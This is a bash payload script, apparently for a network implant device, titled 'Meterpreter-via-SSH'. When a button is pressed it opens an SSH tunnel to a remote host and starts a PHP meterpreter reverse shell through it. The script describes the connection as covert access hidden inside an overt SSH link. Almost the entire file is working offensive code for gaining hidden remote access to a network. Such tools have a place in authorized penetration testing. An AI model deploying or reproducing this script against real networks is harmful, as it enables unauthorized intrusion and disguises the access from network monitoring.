#!/bin/bash
# Title:         Meterpreter-via-SSH
# Description:   Covert meterpreter shell via overt SSH connection
# Author:        Zappus
# Version:       1.0
# Category:      Remote-Access
# Net Mode:      NAT
# Firmware:      1.2
# 
# LED State Descriptions
# Magenta Solid - Configuring NETMODE
# LED OFF - Waiting for BUTTON
# Red Blink 2 Times - SSH Connection Failed
# Amber Blink 5 Times - SSH Connection Successful
# Red Blink 1 Time - Meterpreter Failed
# Cyan Blink 1 Time - Meterpreter Successful


SSH_USER="username"
SSH_HOST="hostname"
MSF_PORT=31337

function start()
{
        LED SETUP
        NETMODE NAT
        sleep 5
        LED OFF
        
        # Wait until BUTTON is pressed 
        while true
        do
                NO_LED=1 BUTTON  && {
                        # close any existing meterpreter and SSH connections
                        kill `pgrep php` 2> /dev/null
                        kill `pgrep -x ssh` 2> /dev/null
                        sleep 2

                        # Establish connection to remote SSH server
                        ssh -f -N -T -M -L $MSF_PORT:127.0.0.1:$MSF_PORT $SSH_USER@$SSH_HOST

                        # Check if SSH connection worked
                        if [ -z `pgrep -x ssh` ]
                        then
                                LED FAIL
                                sleep 5
                                LED OFF
                                continue
                        else
                                LED STAGE1
                                sleep 5
                        fi

                        # Start meterpreter reverse shell
                        meterpreter-php 127.0.0.1 $MSF_PORT &
                        sleep 2

                        # Check if meterpreter shell started
                        if [ -z `pgrep php` ]
                        then
                                # Close SSH connection because meterpreter failed
                                kill `pgrep -x ssh` 2> /dev/null
                                LED FAIL
                        else
                                LED SPECIAL
                        fi
                        sleep 1
                        LED OFF
                        }
        done
}

# Start the payload
start &
